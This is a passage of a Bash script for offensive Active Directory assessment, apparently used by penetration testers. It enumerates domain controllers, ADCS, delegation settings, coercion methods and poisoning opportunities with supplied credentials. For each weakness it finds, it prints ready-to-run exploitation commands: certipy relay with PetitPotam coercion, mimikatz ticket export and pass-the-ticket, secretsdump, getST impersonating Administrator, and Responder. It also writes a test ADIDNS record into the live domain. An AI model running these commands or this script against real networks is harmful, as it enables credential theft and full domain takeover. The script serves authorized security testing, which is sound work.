#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
GREY='\033[0;90m'
NC='\033[0m'

echo ""
echo -e "${GREY}       _____         _____         _____         _____         _____${NC}"
echo -e "${GREY}     .'     '.     .'     '.     .'     '.     .'     '.     .'     '.${NC}"
echo -e "${GREY}    /  o   o  \\   /  o   o  \\   /  o   o  \\   /  o   o  \\   /  o   o  \\${NC}"
echo -e "${GREY}   |           | |           | |           | |           | |           |${NC}"
echo -e "${GREY}   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |${NC}"
echo -e "${GREY}    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /${NC}"
echo -e "${GREY}     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' ${NC}"
echo ""
echo -e "${GREY}    real hackers listen to inside darknet${NC}"
echo ""

# Check Tooling
PREFLIGHT_FAIL=0

for tool in nxc netexec ldapsearch dig nmap showmount; do
  if ! command -v "$tool" &>/dev/null; then
    echo -e "${RED}[ERROR] Missing: $tool (not found in PATH)${NC}"
    PREFLIGHT_FAIL=1
  fi
done

if ! command -v bloodhound-python &>/dev/null && ! command -v bloodhound.py &>/dev/null; then
  echo -e "${RED}[ERROR] Missing: bloodhound-python (not found in PATH)${NC}"
  PREFLIGHT_FAIL=1
fi

if ! command -v dacledit.py &>/dev/null && [ ! -x "/root/.local/bin/dacledit.py" ]; then
  echo -e "${RED}[ERROR] Missing: dacledit.py (not in PATH or /root/.local/bin/)${NC}"
  PREFLIGHT_FAIL=1
fi

if ! command -v certipy &>/dev/null && \
   ! command -v certipy-ad &>/dev/null && \
   [ ! -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
  echo -e "${GREY}[--] certipy not found — ADCS check will be skipped${NC}"
fi

if [ ! -f "/opt/tools/krbrelayx/dnstool.py" ]; then
  echo -e "${GREY}[--] dnstool.py not found - ADIDNS live check will be skipped${NC}"
fi

if ! command -v gowitness &>/dev/null; then
  echo -e "${GREY}[--] gowitness not found — screenshots will be skipped${NC}"
fi

if ! command -v swaks &>/dev/null; then
  echo -e "${GREY}[--] swaks not found — open relay check will be skipped${NC}"
fi

if ! command -v manspider &>/dev/null && [ ! -x "/root/.local/bin/manspider" ]; then
  echo -e "${GREY}[--] manspider not found — SMB content scan will be skipped${NC}"
fi

if ! command -v sccmhunter.py &>/dev/null && [ ! -f "/opt/tools/sccmhunter/sccmhunter.py" ]; then
  echo -e "${GREY}[--] sccmhunter.py not found — SCCM check will be skipped${NC}"
fi

GRIFFON_PATH="/workspace/GriffonAD"
if [ ! -d "$GRIFFON_PATH" ]; then
  git clone https://github.com/shellinvictus/GriffonAD "$GRIFFON_PATH" &>/dev/null 2>&1
  if [ -d "$GRIFFON_PATH" ]; then
    pip install -r "$GRIFFON_PATH/requirements.txt" &>/dev/null 2>&1
    echo -e "${GREEN}[OK] GriffonAD installed${NC}"
  else
    echo -e "${GREY}[--] GriffonAD installation failed${NC}"
  fi
fi

[ "$PREFLIGHT_FAIL" -eq 1 ] && exit 1

echo -e "${GREEN}[OK] Offensive tooling is installed on the attack box${NC}"
echo ""

# Parse arguments
BH_MODE="All"
ARGS=()
SCOPE_FILE=""
SKIP_NEXT=0
for arg in "$@"; do
  if [ "$SKIP_NEXT" -eq 1 ]; then
    SCOPE_FILE="$arg"
    SKIP_NEXT=0
    continue
  fi
  if [ "$arg" = "-fast" ]; then
    BH_MODE="DCOnly"
  elif [ "$arg" = "-scope" ]; then
    SKIP_NEXT=1
  else
    ARGS+=("$arg")
  fi
done
set -- "${ARGS[@]}"

while getopts "u:p:d:fh" opt; do
  case $opt in
    u) AD_USER="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    d) DC_IP="$OPTARG" ;;
    f) BH_MODE="DCOnly" ;;
    h) 
      echo "Usage: $0 -u AD_USER -p password -d dc_ip [-f|-fast] [-scope scope.txt]"
      echo "  -f, -fast    Fast mode: BloodHound DCOnly (skip computer enumeration)"
      echo "  -scope FILE  Additional subnets to scan (one CIDR per line)"
      exit 0
      ;;
    *) exit 1 ;;
  esac
done

# Accept domain or IP, autoresolve to IP if needed
if [ ! -z "$DC_IP" ] && ! [[ "$DC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  DOMAIN_INPUT="$DC_IP"
  
  # Hole PDC via SRV Record
  PDC_HOST=$(dig +short SRV _ldap._tcp.pdc._msdcs.$DOMAIN_INPUT 2>/dev/null | awk '{print $4}' | sed 's/\.$//')
  
  if [ ! -z "$PDC_HOST" ]; then
    DC_IP=$(dig +short "$PDC_HOST" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    echo -e "${GREY}[*] Resolved $DOMAIN_INPUT → $DC_IP (PDC: $PDC_HOST)${NC}"
  else
    DC_IP=$(dig +short "$DOMAIN_INPUT" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    echo -e "${GREY}[*] Resolved $DOMAIN_INPUT → $DC_IP${NC}"
  fi
  
  if [ -z "$DC_IP" ]; then
    echo -e "${RED}[!] Could not resolve: $DOMAIN_INPUT${NC}"
    exit 1
  fi
fi

# Validate
if [ -z "$AD_USER" ] || [ -z "$PASSWORD" ] || [ -z "$DC_IP" ]; then
  echo -e "${RED}[!] Missing parameters${NC}"
  echo "Usage: $0 -u AD_USER -p password -d dc_ip"
  exit 1
fi

# Single nxc call to cache, check user and domain
NXC_SMB=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" 2>/dev/null)
if echo "$NXC_SMB" | grep -qE "STATUS_LOGON_FAILURE|STATUS_ACCOUNT_LOCKED|STATUS_ACCOUNT_DISABLED|STATUS_PASSWORD_EXPIRED"; then
  echo -e "${RED}[ERROR] Authentication failed for $AD_USER against $DC_IP${NC}"
  exit 1
fi
if ! echo "$NXC_SMB" | grep -q "domain:"; then
  echo -e "${RED}[ERROR] Could not reach DC or parse response from $DC_IP${NC}"
  exit 1
fi

# Discover domain
DOMAIN=$(echo "$NXC_SMB" | grep -oP '(?<=domain:)[^)]+' | tr -d ' ')
if [ -z "$DOMAIN" ]; then
  echo -e "${RED}[KO] Failed to discover domain${NC}"
  exit 1
fi
DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
FULL_USER="$AD_USER@$DOMAIN"

# Derive subnet and build scan targets
SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
PRIMARY_SUBNET="${SUBNET}.0/24"
SCAN_TARGETS=("$PRIMARY_SUBNET")
if [ "$SKIP_NEXT" -eq 1 ]; then
  echo -e "${RED}[ERROR] -scope requires a filename argument${NC}"
  exit 1
fi
if [[ "$SCOPE_FILE" == -* ]]; then
  echo -e "${RED}[ERROR] -scope argument looks like a flag, not a filename: $SCOPE_FILE${NC}"
  exit 1
fi
if [ ! -z "$SCOPE_FILE" ]; then
  if [ ! -f "$SCOPE_FILE" ]; then
    echo -e "${RED}[ERROR] Scope file not found: $SCOPE_FILE${NC}"
    exit 1
  fi
  while IFS= read -r cidr; do
    cidr=$(echo "$cidr" | tr -d '[:space:]')
    [ -z "$cidr" ] && continue
    [[ "$cidr" =~ ^# ]] && continue
    SCAN_TARGETS+=("$cidr")
  done < "$SCOPE_FILE"
  echo -e "${GREY}[*] Scope: ${#SCAN_TARGETS[@]} subnet(s) (${SCAN_TARGETS[*]})${NC}"
fi
SCAN_TARGETS_STR="${SCAN_TARGETS[*]}"
RELAY_COUNT=0

# Hostname DC
DC_HOSTNAME=$(echo "$NXC_SMB" | grep -oP '(?<=name:)[^)]+' | tr -d ' ')
if [ -z "$DC_HOSTNAME" ]; then
  DC_HOSTNAME=$(dig +short -x $DC_IP 2>/dev/null | sed 's/\.$//')
fi

# Build FQDN
if [[ ! "$DC_HOSTNAME" =~ \. ]]; then
  DC_FQDN="${DC_HOSTNAME}.${DOMAIN}"
else
  DC_FQDN="$DC_HOSTNAME"
fi

# DC Build + OS
DC_BUILD=$(echo "$NXC_SMB" | grep -oP 'Build \K\d+')
DC_OS=$(echo "$NXC_SMB" | grep -oP 'Windows Server \K[^\)]+')

# Get current directory and create output folder
CURRENT_PATH=$(pwd)
OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M)"
mkdir -p "$OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR/bloodhound"
exec > >(tee >(sed 's/\x1b\[[0-9;]*m//g' > "$OUTPUT_DIR/fkad_report.txt"))

echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
echo -e "${BLUE}[*] Domain    : $DOMAIN${NC}"
echo ""

# Get all Domain Controllers in environment (cache both FQDN + sAMAccountName)
DC_LDAP_RAW=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
  dNSHostName sAMAccountName 2>/dev/null)
ALL_DCS=$(echo "$DC_LDAP_RAW" | grep "^dNSHostName:" | awk '{print $2}' | sort -u)
DC_SAMNAMES=$(echo "$DC_LDAP_RAW" | grep "^sAMAccountName:" | awk '{print tolower($2)}')
  
if [ ! -z "$ALL_DCS" ]; then
  > "$OUTPUT_DIR/all_dcs.txt"
  while read -r dc_fqdn; do
    dc_ip=$(dig +short "$dc_fqdn" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    if [ ! -z "$dc_ip" ]; then
      echo "${dc_fqdn}:${dc_ip}" >> "$OUTPUT_DIR/all_dcs.txt"
    fi
  done <<< "$ALL_DCS"
  DC_COUNT=$(wc -l < "$OUTPUT_DIR/all_dcs.txt")
  echo -e "${GREY}[*] Found $DC_COUNT Domain Controller(s) → all_dcs.txt${NC}"
else
  echo -e "${GREY}[--] Could not enumerate more Domain Controllers${NC}"
  DC_COUNT=0
fi

echo ""

# CA on DC check
if [ -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
  CERTIPY_CMD="/opt/tools/Certipy/venv/bin/certipy"
elif command -v certipy &> /dev/null; then
  CERTIPY_CMD="certipy"
elif command -v certipy-ad &> /dev/null; then
  CERTIPY_CMD="certipy-ad"
else
  CERTIPY_CMD=""
fi

if [ ! -z "$CERTIPY_CMD" ]; then
  CA_HOSTS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
    -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$DOMAIN_DN" \
    "(objectClass=pKIEnrollmentService)" dNSHostName 2>/dev/null | \
    grep "^dNSHostName:" | awk '{print tolower($2)}')
  if [ ! -z "$CA_HOSTS" ]; then
    CA_ON_DC=0
    CA_ON_DC_LIST=""
    if [ -f "$OUTPUT_DIR/all_dcs.txt" ] && [ $DC_COUNT -gt 0 ]; then
      while IFS=: read -r dc_fqdn dc_ip_iter; do
        dc_fqdn_lower=$(echo "$dc_fqdn" | tr '[:upper:]' '[:lower:]')
        while read -r ca_host; do
          if [ "$ca_host" = "$dc_fqdn_lower" ]; then
            CA_ON_DC=$((CA_ON_DC + 1))
            CA_ON_DC_LIST="${CA_ON_DC_LIST}${ca_host}\n"
          fi
        done <<< "$CA_HOSTS"
      done < "$OUTPUT_DIR/all_dcs.txt"
    else
      dc_fqdn_lower=$(echo "$DC_FQDN" | tr '[:upper:]' '[:lower:]')
      while read -r ca_host; do
        if [ "$ca_host" = "$dc_fqdn_lower" ]; then
          CA_ON_DC=$((CA_ON_DC + 1))
          CA_ON_DC_LIST="${CA_ON_DC_LIST}${ca_host}\n"
        fi
      done <<< "$CA_HOSTS"
    fi
    if [ "$CA_ON_DC" -gt 0 ]; then
      echo -e "${RED}[KO] CA installed on Domain Controller${NC}"
      echo -e "$CA_ON_DC_LIST" | while read -r host; do
        [ -z "$host" ] && continue
        echo -e "${RED}       └─ $host${NC}"
      done
    else
      echo -e "${GREEN}[OK] CA not installed on any Domain Controller${NC}"
    fi
  else
    echo -e "${GREY}[--] No CA enrollment services found${NC}"
  fi
fi

# ADCS/PKI Vulnerabilities
ESC8_VULN=0
if [ ! -z "$CERTIPY_CMD" ]; then
  cd "$OUTPUT_DIR"
  $CERTIPY_CMD find -u "$AD_USER" -p "$PASSWORD" -dc-ip $DC_IP -timeout 5 &>/dev/null
  cd "$CURRENT_PATH"
  
  CERTIPY_TXT=$(ls -t "$OUTPUT_DIR"/*_Certipy.txt 2>/dev/null | head -1)
  
  if [ -f "$CERTIPY_TXT" ]; then
    VULNS=$(awk '
      /^  [0-9]+$/ { current="" }
      /CA Name\s*:/ { gsub(/.*CA Name\s*:\s*/, ""); gsub(/\s*$/, ""); current="CA:" $0 }
      /Template Name\s*:/ { gsub(/.*Template Name\s*:\s*/, ""); gsub(/\s*$/, ""); current="Template:" $0 }
      /\[!\] Vulnerabilities/ { in_vuln=1; next }
      in_vuln && /^\s+ESC[0-9]+/ { 
        match($0, /ESC[0-9]+/); 
        esc=substr($0, RSTART, RLENGTH);
        if (current != "") print current "|" esc
      }
      in_vuln && /^  [0-9]+$|^Certificate Templates|^Certificate Authorities/ { in_vuln=0 }
    ' "$CERTIPY_TXT" | sort -u)
    
    if [ ! -z "$VULNS" ]; then
      echo -e "${RED}[KO] ADCS vulnerabilities found → *_Certipy.txt${NC}"
      declare -A GROUPED
      while IFS='|' read -r name esc; do
        if [ -z "${GROUPED[$name]}" ]; then
          GROUPED[$name]="$esc"
        else
          GROUPED[$name]="${GROUPED[$name]}, $esc"
        fi
      done <<< "$VULNS"
      for name in "${!GROUPED[@]}"; do
        echo -e "${RED}       └─ $name: ${GROUPED[$name]}${NC}"
        
        # ESC8 Exploitation Commands
        if [[ "${GROUPED[$name]}" =~ ESC8 ]]; then
          ESC8_CA_HOST=$(echo "$name" | sed 's/CA://')
          
          # Extract DNS Name from Certipy output
          ESC8_CA_DNS=$(awk -v ca="$ESC8_CA_HOST" '
            /CA Name\s*:/ { if ($NF == ca) found=1 }
            found && /DNS Name\s*:/ { print $NF; exit }
          ' "$CERTIPY_TXT")
          
          # Fallback to CA_HOST.DOMAIN if no DNS Name found
          if [ -z "$ESC8_CA_DNS" ]; then
            ESC8_CA_FQDN="${ESC8_CA_HOST}.${DOMAIN}"
          else
            ESC8_CA_FQDN="$ESC8_CA_DNS"
          fi
          
          ESC8_CA_IP=$(dig +short "$ESC8_CA_FQDN" @$DC_IP 2>/dev/null | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
          
          # Extract templates suitable for Domain Controllers
          ESC8_DC_TEMPLATES=$(awk '
            /Template Name\s*:/ { 
              template=$NF; 
              client_auth=0; 
              dc_enroll=0; 
              enabled=0;
            }
            /Enabled\s*:\s*True/ { enabled=1 }
            /Client Authentication\s*:\s*True/ { client_auth=1 }
            /Enrollment Rights.*Domänencontroller|Domain Controllers|Enterprise Domain Controllers/ { 
              dc_enroll=1 
            }
            /^  [0-9]+$/ { 
              if (enabled && client_auth && dc_enroll && template != "") {
                print template
              }
              template=""; client_auth=0; dc_enroll=0; enabled=0;
            }
          ' "$CERTIPY_TXT" | tr '\n' ', ' | sed 's/,$//')
          
          if [ ! -z "$ESC8_CA_IP" ] && [ ! -z "$ESC8_DC_TEMPLATES" ]; then
            ESC8_FIRST_DC_TEMPLATE=$(echo "$ESC8_DC_TEMPLATES" | cut -d',' -f1)
            echo -e "${GREY}       └─ ESC8 - DC Templates: ${ESC8_DC_TEMPLATES}${NC}"

            # ESC8 reachability + WebClient cross-reference
            ESC8_CA_HTTP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "http://$ESC8_CA_IP/certsrv/" 2>/dev/null)
            ESC8_CA_NTLM_HEADER=$(curl -sk -D - --max-time 5 "http://$ESC8_CA_IP/certsrv/" 2>/dev/null | grep -i "WWW-Authenticate")

            if [ "$ESC8_CA_HTTP_CODE" != "000" ] && [ ! -z "$ESC8_CA_HTTP_CODE" ]; then
              if echo "$ESC8_CA_NTLM_HEADER" | grep -qi "NTLM\|Negotiate"; then
                echo -e "${RED}       └─ /certsrv/ reachable + NTLM confirmed — directly exploitable${NC}"
              else
                echo -e "${GREY}       └─ /certsrv/ reachable (HTTP $ESC8_CA_HTTP_CODE) but no NTLM header${NC}"
              fi
            else
              echo -e "${GREY}       └─ /certsrv/ not reachable from this host — pivot may be required${NC}"
            fi
            
            echo -e "${GREY}          1) certipy-ad relay -target https://${ESC8_CA_IP}/certsrv/certfnsh.asp -ca ${ESC8_CA_HOST%%.*} -template ${ESC8_FIRST_DC_TEMPLATE}${NC}"
            echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
            echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
            ESC8_VULN=1
          fi
        fi
      done
    else
      echo -e "${GREEN}[OK] ADCS detected, no exploitable vulnerabilities${NC}"
    fi
  else
    echo -e "${GREY}[--] No ADCS/PKI infrastructure detected${NC}"
  fi
else
  echo -e "${GREY}[--] Certipy not found, skipping ADCS check${NC}"
fi
mv "$OUTPUT_DIR"/*_Certipy.json "$OUTPUT_DIR/bloodhound/" 2>/dev/null

# ADCS/PKI Vulnerabilities - ADCS CA Officer check
if [ ! -z "$CERTIPY_CMD" ]; then
  CA_OFFICERS_RAW=$($CERTIPY_CMD find -u "$AD_USER" -p "$PASSWORD" -dc-ip $DC_IP -target $DC_FQDN -stdout 2>/dev/null | grep -A3 "ManageCa\|ManageCertificates")
  CA_DANGEROUS=$(echo "$CA_OFFICERS_RAW" | grep -vi "admin\|ManageCa\|ManageCertificates\|^--$\|BUILTIN\|Users" | grep -i "$DOMAIN\\\\" | awk '{print $NF}' | sort -u)
  if [ ! -z "$CA_DANGEROUS" ]; then
    CA_COUNT=$(echo "$CA_DANGEROUS" | wc -l)
    echo -e "${RED}[KO] $CA_COUNT non-default ADCS Officier (ManageCA/ManageCertificates) principal(s) → adcs_officers.txt${NC}"
    echo "$CA_DANGEROUS" > "$OUTPUT_DIR/adcs_officers.txt"
  else
    echo -e "${GREEN}[OK] ADCS Officer (ManageCA/ManageCertificates) restricted${NC}"
  fi
fi

echo ""

# Unconstrained Delegation - Computer
UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
  grep "^sAMAccountName:" | awk '{print $2}')

NON_DC_UNCON=""
dc_short=$(echo "$DC_FQDN" | cut -d'.' -f1 | tr '[:upper:]' '[:lower:]')
while IFS= read -r system; do
  [ -z "$system" ] && continue
  system_lower=$(echo "$system" | tr '[:upper:]' '[:lower:]')
  system_clean="${system_lower%\$}"
  if ! echo "$DC_SAMNAMES" | grep -qx "$system_lower" && [ "$system_clean" != "$dc_short" ]; then
    NON_DC_UNCON="${NON_DC_UNCON}${system}\n"
  fi
done <<< "$UNCON_SYSTEMS"

NON_DC_UNCON=$(echo -e "$NON_DC_UNCON" | grep -v "^$")
NON_DC_COUNT=$(echo "$NON_DC_UNCON" | grep -v "^$" | wc -l)

if [ "$NON_DC_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $NON_DC_COUNT non-DC system(s) with Unconstrained Delegation${NC}"
  while IFS= read -r system; do
    [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
  done <<< "$NON_DC_UNCON"
  FIRST_NON_DC_UNCON=$(echo "$NON_DC_UNCON" | head -1 | tr -d ' ')
  echo -e "${GREY}          1) $FIRST_NON_DC_UNCON: mimikatz sekurlsa::tickets /export${NC}"
  echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <HOST_IP> $DC_IP${NC}"
  echo -e "${GREY}          3) mimikatz: kerberos::ptt <DC_TGT>.kirbi${NC}"
  echo -e "${GREY}          4) secretsdump.py -k -no-pass '$DOMAIN/DC01\$@$DC_FQDN'${NC}"
else
  echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
fi

# Unconstrained Delegation - User
UNCON_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')

UNCON_USER_COUNT=$(echo "$UNCON_USERS" | grep -v "^$" | wc -l)

if [ "$UNCON_USER_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $UNCON_USER_COUNT user(s) with Unconstrained Delegation${NC}"
  echo "$UNCON_USERS" | while read -r user; do
    [ ! -z "$user" ] && echo -e "${RED}       └─ $user${NC}"
  done
else
  echo -e "${GREEN}[OK] No Unconstrained Delegation on users${NC}"
fi

# Constrained Delegation
CONSTRAINED=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo 2>/dev/null | grep -E "^(sAMAccountName|msDS-AllowedToDelegateTo):" | awk '/^sAMAccountName:/ {name=$2} /^msDS-AllowedToDelegateTo:/ {print name " → " $2}')
USER_CD=$(echo "$CONSTRAINED" | grep -vE '^\S+\$ →' | grep -v "^$")
DC_TARGET=$(echo "$CONSTRAINED" | grep -iE "→.*(${DC_HOSTNAME}|${DC_FQDN})" | grep -v "^$")
CRITICAL_CD=$(echo -e "${USER_CD}\n${DC_TARGET}" | grep -v "^$" | sort -u)
CRITICAL_COUNT=$(echo "$CRITICAL_CD" | grep -v "^$" | wc -l)
if [ "$CRITICAL_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $CRITICAL_COUNT Constrained Delegation entry/entries${NC}"
  echo "$CRITICAL_CD" | while read -r line; do
    [ ! -z "$line" ] && echo -e "${RED}       └─ $line${NC}"
  done
else
  echo -e "${GREEN}[OK] No Constrained Delegation on user accounts or DC targets${NC}"
fi

# Resource-Based Constrained Delegation (RBCD)
RBCD_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}')
RBCD_COUNT=$(echo "$RBCD_OUTPUT" | grep -v "^$" | wc -l)
if [ "$RBCD_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $RBCD_COUNT object(s) with Resource-Based Constrained Delegation (RBCD) configured${NC}"
  echo "$RBCD_OUTPUT" | while read -r account; do
    [ -z "$account" ] && continue
    echo -e "${RED}       └─ $account${NC}"
  done
  echo -e "${GREY}          └─ getST.py -spn cifs/$DC_FQDN \"$DOMAIN/ATTACKER\$\" -impersonate Administrator -dc-ip $DC_IP${NC}"
else
  echo -e "${GREEN}[OK] No Resource-Based Constrained Delegation (RBCD) configs found${NC}"
fi

# ms-DS-CreatorSID
CREATORSID_OUTPUT=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" -b "$DOMAIN_DN" "(&(objectClass=computer)(ms-DS-CreatorSID=*))" sAMAccountName ms-DS-CreatorSID dNSHostName 2>/dev/null)
CREATOR_COUNT=$(echo "$CREATORSID_OUTPUT" | grep -c "^ms-DS-CreatorSID:")
if [ "$CREATOR_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $CREATOR_COUNT computer(s) with ms-DS-CreatorSID (RBCD risk)${NC}"
  paste - - - < <(echo "$CREATORSID_OUTPUT" | grep -E "^(sAMAccountName|ms-DS-CreatorSID):" | awk '{print $2}') | while IFS=$'\t' read -r computer sid; do
    [ -z "$computer" ] && continue
    OWNER=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
      -b "$DOMAIN_DN" \
      "(objectSid=$sid)" sAMAccountName 2>/dev/null | grep "^sAMAccountName:" | awk '{print $2}' | head -1)
    [ -z "$OWNER" ] && OWNER="UNKNOWN"
    echo -e "${RED}       └─ $OWNER created $computer${NC}"
  done
else
  echo -e "${GREEN}[OK] No ms-DS-CreatorSID entries found${NC}"
fi

echo ""

# Authentication Coercion & Poisoning - Coerce Methods
COERCE_OUTPUT=$(nxc smb $DC_IP -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -M coerce_plus 2>/dev/null)
COERCE_METHODS=$(echo "$COERCE_OUTPUT" | grep "VULNERABLE," | grep -oP 'VULNERABLE, \K.*' | sort -u | tr '\n' ', ' | sed 's/,$//')
if [ ! -z "$COERCE_METHODS" ]; then
  echo -e "${RED}[KO] Coerce methods available on DC ($COERCE_METHODS) → coerce.txt${NC}"
  echo "$COERCE_OUTPUT" | grep "VULNERABLE," > "$OUTPUT_DIR/coerce.txt"
  if [ ! -z "$NON_DC_UNCON" ]; then
    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
  fi
  PREFERRED_ORDER=("PetitPotam" "PrinterBug" "DFSCoerce" "ShadowCoerce" "MSEven")
    FIRST_COERCE=""
    for method in "${PREFERRED_ORDER[@]}"; do
      if echo "$COERCE_METHODS" | grep -q "$method"; then
        FIRST_COERCE="$method"
        break
      fi
    done
    case "$FIRST_COERCE" in
      PetitPotam)   echo -e "${GREY}       └─ petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
      PrinterBug)   echo -e "${GREY}       └─ printerbug.py '$DOMAIN'/'$AD_USER':'$PASSWORD'@$DC_IP <LISTENER_IP>${NC}" ;;
      DFSCoerce)    echo -e "${GREY}       └─ dfscoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
      ShadowCoerce) echo -e "${GREY}       └─ shadowcoerce.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
      MSEven)       echo -e "${GREY}       └─ mseven.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}" ;;
    esac
else
  echo -e "${GREEN}[OK] No coerce methods available on DC${NC}"
fi

# Create Relay List and filter DC IPs from relay targets
> "$OUTPUT_DIR/relay_targets_raw.txt"
for target in "${SCAN_TARGETS[@]}"; do
  nxc smb "$target" -u "$AD_USER" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_raw_tmp.txt" &>/dev/null
  [ -f "$OUTPUT_DIR/relay_raw_tmp.txt" ] && cat "$OUTPUT_DIR/relay_raw_tmp.txt" >> "$OUTPUT_DIR/relay_targets_raw.txt"
  rm -f "$OUTPUT_DIR/relay_raw_tmp.txt"
done
DC_IPS=$(awk -F: '{print $2}' "$OUTPUT_DIR/all_dcs.txt" 2>/dev/null)
if [ -f "$OUTPUT_DIR/relay_targets_raw.txt" ]; then
  > "$OUTPUT_DIR/relay_targets.txt"
  while IFS= read -r ip; do
    if ! echo "$DC_IPS" | grep -q "^$ip$"; then
      echo "$ip" >> "$OUTPUT_DIR/relay_targets.txt"
    fi
  done < "$OUTPUT_DIR/relay_targets_raw.txt"
  rm "$OUTPUT_DIR/relay_targets_raw.txt"
fi
RELAY_COUNT=$([ -f "$OUTPUT_DIR/relay_targets.txt" ] && wc -l < "$OUTPUT_DIR/relay_targets.txt" || echo 0)

# Authentication Coercion & Poisoning - WPAD
WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
if echo "$WPAD_DNS" | grep -q "can't find"; then
  echo -e "${RED}[KO] No WPAD DNS entry (WPAD Poisoning)${NC}"
  echo -e "${GREY}       └─ Responder -I <IF> -wF${NC}"
else
  echo -e "${GREEN}[OK] WPAD DNS entry exists (no WPAD Poisoning)${NC}"
fi

# Authentication Coercion & Poisoning - IPv6 DNS
IPV6_ENABLED=$(dig +short AAAA $DC_HOSTNAME 2>/dev/null)
if [ -z "$IPV6_ENABLED" ]; then
  echo -e "${RED}[KO] No IPv6 DNS record for DC (DHCPv6 Poisoning)${NC}"
  IPV6_VULN=1
else
  echo -e "${GREEN}[OK] IPv6 DNS configured for DC (no DHCPv6 Poisoning)${NC}"
  IPV6_VULN=0
fi

# Authentication Coercion & Poisoning - ADIDNS Poisoning
ADIDNS_TEST=$(/opt/tools/krbrelayx/venv/bin/python3 /opt/tools/krbrelayx/dnstool.py -u "$DOMAIN\\$AD_USER" -p "$PASSWORD" -r "attacktest.${DOMAIN}" -a add -d 127.0.0.1 -dc-ip $DC_IP $DC_IP 2>&1)
if echo "$ADIDNS_TEST" | grep -q "completed successfully"; then
  ADIDNS_CLEANUP=$(/opt/tools/krbrelayx/venv/bin/python3 /opt/tools/krbrelayx/dnstool.py -u "$DOMAIN\\$AD_USER" -p "$PASSWORD" -r "attacktest.${DOMAIN}" -a ldapdelete -dc-ip $DC_IP $DC_IP 2>&1)
  if ! echo "$ADIDNS_CLEANUP" | grep -q "completed successfully"; then
    echo -e "${RED}[!] ADIDNS test record cleanup failed - delete manually: attacktest.${DOMAIN} on $DC_IP${NC}"
  fi
  echo -e "${RED}[KO] ADIDNS zone write possible (ADIDNS Poisoning)${NC}"
  if [ "$RELAY_COUNT" -gt 0 ]; then
